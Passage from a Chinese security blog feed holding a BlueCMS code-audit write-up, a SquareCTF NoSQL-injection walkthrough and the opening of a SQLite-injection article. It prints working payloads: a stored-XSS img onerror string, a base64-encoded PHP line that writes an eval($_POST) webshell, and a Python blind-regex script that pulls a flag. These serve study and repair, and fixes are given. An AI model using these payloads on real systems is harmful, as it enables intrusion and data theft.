<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($_REQUEST[<span class="string">&#x27;act&#x27;</span>] == <span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">&quot;DELETE FROM &quot;</span>.table(<span class="string">&#x27;attachment&#x27;</span>).<span class="string">&quot; WHERE att_id = &quot;</span>.$_GET[<span class="string">&#x27;att_id&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(!$db-&gt;query($sql))&#123;</span><br><span class="line">		showmsg(<span class="string">&#x27;删除附加属性出错&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	showmsg(<span class="string">&#x27;删除附加属性成功&#x27;</span>,<span class="string">&#x27;attachment.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接拼接 <code>$_GET[&#39;att_id&#39;]</code></p>
<p>etc.</p>
<h5 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h5><p>麻烦直接用 PDO 谢谢</p>
<h2 id="XSS-漏洞"><a href="#XSS-漏洞" class="headerlink" title="XSS 漏洞"></a>XSS 漏洞</h2><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>上边我们注意到 uploads/user.php 注册输入的参数只经过 <code>trim</code>、<code>addslashes</code>  消毒，我们现在来考虑其是否存在存储型 XSS ，因为用户名有长度限制，我们来考虑邮箱。</p>
<p><img src="https://i.loli.net/2020/12/05/dpA17ZUiwR4xhcQ.png" style="zoom:80%;" /></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_email</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> pattern = <span class="regexp">/^([a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(.[a-zA-Z0-9_-])+/</span>;</span><br><span class="line">	<span class="keyword">if</span> (!pattern.test(<span class="built_in">document</span>.reg_form.email.value)) &#123;</span><br><span class="line">		msg = <span class="string">&quot;&lt;span style=&#x27;color:red&#x27;&gt;邮箱格式不正确&lt;/span&gt;&quot;</span>;</span><br><span class="line">		$(<span class="string">&quot;check_email_warning&quot;</span>).innerHTML = msg;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		msg = <span class="string">&quot;&lt;span style=&#x27;color:#006CCE&#x27;&gt;邮箱格式正确&lt;/span&gt;&quot;</span>;</span><br><span class="line">		$(<span class="string">&quot;check_email_warning&quot;</span>).innerHTML = msg;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上，前端正则匹配很严格，我们抓包来修改数据绕过：</p>
<p><img src="https://i.loli.net/2020/12/05/DWikwMObPx6aXoB.png" /></p>
<p>我们再登录访问会员中心：</p>
<p><img src="https://i.loli.net/2020/12/05/LA1VU3Bo6XZz9Kl.png" style="zoom:80%;" /></p>
<p>同样的在 uploads/user.php 发布新闻功能中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$content = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;content&#x27;</span>]) ? filter_data($_POST[<span class="string">&#x27;content&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>uploads/include/common.fun.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_data</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$str = preg_replace(<span class="string">&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;</span>, <span class="string">&quot;&quot;</span>, $str);</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以参考<a href="https://www.freebuf.com/articles/web/157589.html">挖洞经验 | 可以被XSS利用的HTML标签和一些手段技巧</a> ，如 <code>script</code> 等被 ban 情况下绕过方式。</p>
<p>虽然 ban 了很多标签，但 img 还是漏了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/12/05/l3Ov4D7M2raiNFx.png" /></p>
<p><img src="C:\Users\landv\AppData\Roaming\Typora\typora-user-images\image-20201205162012924.png" alt="image-20201205162012924" style="zoom:80%;" /></p>
<h5 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h5><p>限制邮箱长度，过滤邮箱输入里的非法字符，传输过程加密，不输出报错内容。</p>
<h2 id="文件包含漏洞-文件上传漏洞-getshell"><a href="#文件包含漏洞-文件上传漏洞-getshell" class="headerlink" title="文件包含漏洞 + 文件上传漏洞 getshell"></a>文件包含漏洞 + 文件上传漏洞 getshell</h2><p>uploads/user.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">&#x27;pay&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;data/pay.cache.php&#x27;</span>;</span><br><span class="line">	$price = $_POST[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">	$id = $_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	$name = $_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">&#x27;pay&#x27;</span>])) &#123;</span><br><span class="line">		showmsg(<span class="string">&#x27;对不起，您没有选择支付方式&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;include/payment/&#x27;</span>.$_POST[<span class="string">&#x27;pay&#x27;</span>].<span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件路径是直接拼接，但后面还有 <code>/index.php</code> ，我们可以考虑 <code>%00</code> 截断。</p>
<p>限制条件：PHP &lt; 5.3.29，且 GPC 关闭</p>
<p>和本文一开始的 PHP 版本不同注意了，先改动 PHP 版本再来复现。</p>
<p>具体可以参考<a href="https://my.oschina.net/u/4587690/blog/4470406">这篇文章</a>，这里不明白是不是支付缓存文件丢失的原因，抓不到相应的包，修改代码也无济于事，故只从代码角度复现漏洞。</p>
<p>另外 <code>%00</code> 截断，除了修改 Request 中 HEX 形式的 20 为 00 以外，还可以直接 <code>%00</code> 选中，进行 URL 解码。</p>
<p>用户资料有可上传头像，我们先看上传部分是否有消毒：</p>
<p>uploads/user.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;face_pic2&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &amp;&amp; $_FILES[<span class="string">&#x27;face_pic2&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">	$face_pic = $image-&gt;img_upload($_FILES[<span class="string">&#x27;face_pic2&#x27;</span>],<span class="string">&#x27;face_pic&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>uploads/include/upload.class.php</p>
<p>注释部分为对应源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">img_upload</span>(<span class="params">$file, $dir = <span class="string">&#x27;&#x27;</span>, $imgname = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($dir))&#123;</span><br><span class="line">    	$dir = BLUE_ROOT.DATA.UPLOAD.date(<span class="string">&quot;Ym&quot;</span>).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	$dir = BLUE_ROOT.DATA.UPLOAD.$dir.<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//	private $allow_image_type = array(&#x27;image/jpeg&#x27;, &#x27;image/gif&#x27;, &#x27;image/png&#x27;, &#x27;image/pjpeg&#x27;);</span></span><br><span class="line">	<span class="keyword">if</span>(!in_array($file[<span class="string">&#x27;type&#x27;</span>],<span class="keyword">$this</span>-&gt;allow_image_type))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;不允许的图片类型&lt;/font&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($imgname))&#123;</span><br><span class="line">    	$imgname = <span class="keyword">$this</span>-&gt;create_tempname().<span class="string">&#x27;.&#x27;</span>.<span class="keyword">$this</span>-&gt;get_type($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//function create_tempname()&#123;</span></span><br><span class="line">    <span class="comment">//	return time().mt_rand(0,9);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    	<span class="keyword">if</span>(!mkdir($dir))&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;上传过程中创建目录失败&lt;/font&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $imgname = $dir . $imgname;</span><br><span class="line"></span><br><span class="line">   	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;uploading($file[<span class="string">&#x27;tmp_name&#x27;</span>], $imgname))&#123;</span><br><span class="line">   		<span class="keyword">return</span> str_replace(BLUE_ROOT, <span class="string">&#x27;&#x27;</span>, $imgname);</span><br><span class="line">   	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font style=&quot;color:red;&quot;&gt;上传图片失败&lt;/font&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">   	&#125;</span><br><span class="line">    <span class="comment">//if($this-&gt;uploading($file[&#x27;tmp_name&#x27;], $imgname))&#123;</span></span><br><span class="line">    <span class="comment">//	return str_replace(BLUE_ROOT, &#x27;&#x27;, $imgname);</span></span><br><span class="line">    <span class="comment">//&#125;else&#123;</span></span><br><span class="line">    <span class="comment">//	echo &#x27;&lt;font style=&quot;color:red;&quot;&gt;上传图片失败&lt;/font&gt;&#x27;;</span></span><br><span class="line">	<span class="comment">//	exit;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为是随机生成的文件名，如果要 getshell 需要我们想办法写一个图片马，创建我们自己的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @fputs(fopen(base64_decode(<span class="string">&#x27;bXVtYS5waHA=&#x27;</span>),w),base64_decode(<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWyd3ayddKTs/Pg==&#x27;</span>));<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//bXVtYS5waHA=  -&gt;  muma.php</span></span><br><span class="line"><span class="comment">//PD9waHAgQGV2YWwoJF9QT1NUWyd3ayddKTs/Pg==  -&gt;  <span class="meta">&lt;?php</span> @eval($_POST[&#x27;wk&#x27;]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这是 payload ，不过个人觉得即使不用编码也可以写进去。</p>
<h5 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h5><p>对 pay 过滤，图片不显示具体路径，并二次渲染。</p>
<h2 id="SSRF-漏洞"><a href="#SSRF-漏洞" class="headerlink" title="SSRF 漏洞"></a>SSRF 漏洞</h2><p>uploads/user.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">&#x27;face_pic1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($_POST[<span class="string">&#x27;face_pic1&#x27;</span>], <span class="string">&#x27;http://&#x27;</span>) != <span class="literal">false</span> &amp;&amp; strpos($_POST[<span class="string">&#x27;face_pic1&#x27;</span>], <span class="string">&#x27;https://&#x27;</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">        showmsg(<span class="string">&#x27;只支持本站相对路径地址&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $face_pic = trim($_POST[<span class="string">&#x27;face_pic1&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(file_exists(BLUE_ROOT.$_POST[<span class="string">&#x27;face_pic3&#x27;</span>]))&#123;</span><br><span class="line">		@unlink(BLUE_ROOT.$_POST[<span class="string">&#x27;face_pic3&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是用户个人资料的用户头像链接输入。</p>
<p><img src="https://i.loli.net/2020/12/05/y9xPR3QTUshuX6k.png" style="zoom:80%;" /></p>
<p>注意这里没有用 <code>!==</code> ，是 PHP 弱比较，根据 <code>strpos()</code>返回值为 0 是和 false 相等的，故能够绕过造成SSRF漏洞。</p>
<h2 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h2><p>跟 SSRF 的问题代码一样，我们注意到 else 分支是有 <code>unlink</code> 的，通过使用户头像那一栏为空，我们可以删除 <code>face_pic3</code> 对应文件。</p>
<p>根目录创建 delete.php 。</p>
<p><img src="https://i.loli.net/2020/12/05/jKH4pb6QnaXwMz2.png" alt=""></p>
<p>另外全局搜索还有很多 <code>unlink</code> 之类的，就不一一列举了，另外还有很多修改 / 读取的漏洞，同样原理。</p>
<h5 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h5><ol>
<li>统一文件夹存放</li>
<li>数据库记录存储路径</li>
<li>对于入库记录进行严格的防注入和文件上传检测，采用白名单方式来检查后缀，黑名单过滤上跳等操作，严格做到数据库与文件同步</li>
<li>能用云存储就用，实在不能用在自己写</li>
<li>尽量少的使用文件删除功能</li>
</ol>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实还有很多变量覆盖漏洞，但是此类漏洞若不与其他漏洞组合是无法发挥更大作用的，combo 是最重要的（hero 就是要呼朋引伴超融合</p>
<p>个人觉得拿到一个环境前，先做功能模块导图是个好习惯，记录下比如用户可以上传文件之类的地方，果不其然，在文中大部分相应漏洞都能对得上。这就好比恐解 RPG 游戏中，事先做一份地图比无头苍蝇一样到处乱撞触发 flag 要强 :-)</p>
<p>再说 CMS 审计流程，这次是跟着复现 blog 走过场的，但觉得意义并不大，毕竟还是要独立行走，主要是缺少了自己对项目代码的<strong>熟悉度</strong>！所以还是要吸取教训不能一味跟着博客走，博客也是别人自己琢磨出来的！</p>
<p>Seay 其实给了明确的方向了，指出有哪些漏洞，就跟着回溯变量看问题所在，法师的那本书一定要当作圣典过几周目。</p>
<p>比如有一个函数有漏洞，就如 SQL 注入里的 <code>deep_addslashes</code> 这个函数，有一处可打，就全部可打。</p>
<p>同时给出修复建议我觉得也是很好的习惯，做安全不能只做攻击者，我们审计的目的是为了修复它。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7074#toc-10">bluecms v1.6 sp1 代码审计 - 先知社区 (aliyun.com)</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>PHP审计</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 SquareCTF Web 复现记录</title>
    <url>/archives/5856e475.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2020 年 11 月 13 日由 Square 举办的一场比赛，因为与上海大学生赛冲突了并没有打。看推说有 NoSQL 注入，正好前不久就写了关于 NoSQL 的文章<a href="https://landvsec.top/archives/15015253.html">《MongoDB 注入初识》</a> ，想借此来巩固知识。</p>
<p>比赛只有两道 web ，另外一道水平原因太菜了做不出来 orz</p>
<a id="more"></a>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="Deep-Web-Blog"><a href="#Deep-Web-Blog" class="headerlink" title="Deep Web Blog"></a>Deep Web Blog</h2><blockquote>
<p>A secret informant has tipped us off that hackers on the deep web have been plotting an attack on Square to steal our treasured Bitcoins…</p>
</blockquote>
<p>打开是一个博客界面，唯一的功能只有搜索，但搜索功能并没有模糊匹配（且对大小写敏感），whatever，抓包我发现了 posts api 接口，并且可以 get 传参 title 精确匹配到文档：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># request get </span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365a&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Blockchain for dummies&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365b&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;How to get free bitcoins&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365c&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;My Favorite Tool: cipsum.com&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365d&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;manifesto&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365e&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;test&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;It works!&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># test 1</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?title&#x3D;test</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365e&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;test&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;It works!&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>值得我们注意的是 <code>_id</code> 这个字段：</p>
<p>MongoDB 存储在集合中的每个文档都需要一个唯一的 <code>_id</code> 字段作为主键。如果插入的文档省略了该 <code>_id</code> 字段，则MongoDB驱动程序会自动为该字段生成一个 <code>ObjectId_id</code> 。</p>
<p>好吧，已经明示了是 NoSQL 注入了，接下来我们要考虑怎么 getflag 。</p>
<p>先用 <code>$ne</code> 进行测试（实际上这里只能回显前 5 条文档）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># test 2</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?title[$ne]&#x3D;test</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365a&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Blockchain for dummies&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365b&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;How to get free bitcoins&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365c&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;My Favorite Tool: cipsum.com&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365d&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;manifesto&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;...&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365f&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;flag&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;Looking for a flag? You won&#39;t find it here. Maybe this can help: https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Jbix9y8iV38&quot;,</span><br><span class="line">        &quot;flag&quot;: &quot;[REDACTED] Flag format detected - redacted by WAF&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>查询结果有有关 flag 的一条文档记录，提示有 WAF 。</p>
<p>实际上，在之前的测试中，如果没有精确匹配到相关文档是会返回空列表的：</p>
<p><img src="https://i.loli.net/2020/11/15/f5MGiabenx9IoXT.png" style="zoom:80%;" /></p>
<p>既然只有两种不同回显，我自然而然想到了利用 <code>$regex</code> 来盲注，这里我们通过 <code>$regex</code> 匹配 flag 文档的 flag 字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># test 3</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?flag[$regex]&#x3D;flag&#123;.*&#125;</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365f&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;flag&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;Looking for a flag? You won&#39;t find it here. Maybe this can help: https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Jbix9y8iV38&quot;,</span><br><span class="line">        &quot;flag&quot;: &quot;[REDACTED] Flag format detected - redacted by WAF&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># test 4</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?flag[$regex]&#x3D;flag&#123;a.*&#125;</span><br><span class="line"># response</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"># test 5</span><br><span class="line"># request get</span><br><span class="line">http:&#x2F;&#x2F;challenges.2020.squarectf.com:9542&#x2F;api&#x2F;posts?flag[$regex]&#x3D;flag&#123;n.*&#125;</span><br><span class="line"># response</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;_id&quot;: &quot;5faff099307b240008a4365f&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;flag&quot;,</span><br><span class="line">        &quot;content&quot;: &quot;Looking for a flag? You won&#39;t find it here. Maybe this can help: https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Jbix9y8iV38&quot;,</span><br><span class="line">        &quot;flag&quot;: &quot;[REDACTED] Flag format detected - redacted by WAF&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>根据上面测试的结果可以写出对应 Python 脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        url = <span class="string">&quot;http://challenges.2020.squarectf.com:9542/api/posts?flag[$regex]=&#123;&#125;&#123;&#125;.*&quot;</span>.<span class="built_in">format</span>(flag, j)</span><br><span class="line">        response = requests.request(<span class="string">&quot;GET&quot;</span>, url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(<span class="string">&quot;[i] the result is: &quot;</span> + flag)</span><br><span class="line">            <span class="keyword">if</span> flag[:<span class="number">-1</span>]==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/15/LQYndBlVOyWxC7M.png" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中的SQLite合集</title>
    <url>/archives/d8b7f817.html</url>
    <content><![CDATA[<div class="note info">
            <p>本文由<strong>landvsec</strong>原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/222625">https://www.anquanke.com/post/id/222625</a><br>安全客 - 有思想的安全新媒体</p>
          </div>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>几次比赛都遇到了 SQLite 注入的题目，所以想来具体学习一下 SQLite 到底有哪些利用点。行文如有不当，还请师傅们在评论区留言捉虫，不甚感激。</p>
<a id="more"></a>
<h1 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQLite 是一个嵌入式 SQL 数据库引擎。与大多数其他 SQL 数据库不同，SQLite 没有独立的服务器进程。SQLite 直接读写普通磁盘文件。一个包含多个表、索引、触发器和视图的完整 SQL 数据库包含在一个磁盘文件中，但也因为轻型，所以不可避免的有一些安全隐患，比如数据库下载，有固定/默认数据库名/地址的问题，可下载造成安全威胁。</p>
<h2 id="数据库判别"><a href="#数据库判别" class="headerlink" title="数据库判别"></a>数据库判别</h2><p>拿到一个环境首先做的应该是后端数据库的判别。</p>
<p>以下列出的是可供判别后端数据库的函数，在同一行并不意味着功能相同：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>MYSQL</th>
<th>SQLite</th>
</tr>
</thead>
<tbody>
<tr>
<td>@@version / version()</td>
<td>sqlite_version()</td>
</tr>
<tr>
<td>connection_id()</td>
<td>last_insert_rowid()</td>
</tr>
<tr>
<td>last_insert_id()</td>
<td>strftime(‘%s’,’now’);</td>
</tr>
<tr>
<td>row_count()</td>
<td></td>
</tr>
<tr>
<td>crc32(‘MySQL’)</td>
<td></td>
</tr>
<tr>
<td>BINARY_CHECKSUM(123)</td>
</tr>
</tbody>
</table>
</div>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>接下来通过两道题来理解 SQLite 的一些特性，方便我们后面总结 Cheat Sheet：</p>
<h2 id="phpNantokaAdmin"><a href="#phpNantokaAdmin" class="headerlink" title="phpNantokaAdmin"></a>phpNantokaAdmin</h2><p>路由 index、create、insert、delete ，功能对应显示、创建表、插入数据、删表。</p>
<p>先看有关 flag 的信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pdo-&gt;query(<span class="string">&#x27;CREATE TABLE `&#x27;</span> . FLAG_TABLE . <span class="string">&#x27;` (`&#x27;</span> . FLAG_COLUMN . <span class="string">&#x27;` TEXT);&#x27;</span>);</span><br><span class="line">$pdo-&gt;query(<span class="string">&#x27;INSERT INTO `&#x27;</span> . FLAG_TABLE . <span class="string">&#x27;` VALUES (&quot;&#x27;</span> . FLAG . <span class="string">&#x27;&quot;);&#x27;</span>);</span><br><span class="line">$pdo-&gt;query($sql);</span><br></pre></td></tr></table></figure>
<p>这是源码中创建完用户自定义的表后，使用 config.php 中定义好了的 <code>FLAG_TABLE</code> 、<code>FLAG_COLUMN</code>、<code>FLAG</code> 三个常量创建表，作为我们的 <code>target</code> 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$stmt = $pdo-&gt;query(<span class="string">&quot;SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27; AND name &lt;&gt; &#x27;&quot;</span> . FLAG_TABLE . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>当然，它不会就这么简单地显示在 index 页面中。</p>
